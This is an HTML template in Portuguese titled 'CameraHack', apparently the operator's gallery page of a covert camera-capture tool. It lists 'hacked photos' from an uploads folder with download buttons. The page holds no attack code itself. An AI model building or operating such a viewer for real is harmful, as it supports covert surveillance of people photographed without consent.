<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CameraHack - Fotos</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: #000;
            color: #00ff00;
            font-family: 'Share Tech Mono', monospace;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            padding: 20px;
        }
        .photo-card {
            background: #111;
            border: 1px solid #00ff00;
            padding: 10px;
            border-radius: 5px;
        }
        .photo-card img {
            width: 100%;
            height: auto;
            margin-bottom: 10px;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            text-decoration: none;
            margin: 10px;
            cursor: pointer;
            font-family: 'Share Tech Mono', monospace;
        }
        .button:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 10px #00ff00;
        }
        .controls {
            text-align: center;
            margin: 20px 0;
        }
        .download-btn {
            width: 100%;
            text-align: center;
            margin: 5px 0;
        }
        .download-btn .button {
            width: 80%;
            margin: 0;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <h1>Fotos Hackeadas</h1>

        <div class="gallery">
            {% for foto in fotos %}
            <div class="photo-card">
                <img src="/uploads/fotos/{{ foto }}" alt="Foto hackeada">
                <div class="download-btn">
                    <a href="/uploads/fotos/{{ foto }}" download class="button">
                        DOWNLOAD ðŸ“¥
                    </a>
                </div>
            </div>
            {% endfor %}
        </div>

        <div class="controls">
            <button onclick="location.reload()" class="button">Recarregar</button>
            <a href="/" class="button">Voltar</a>
        </div>
    </div>
</body>
</html>
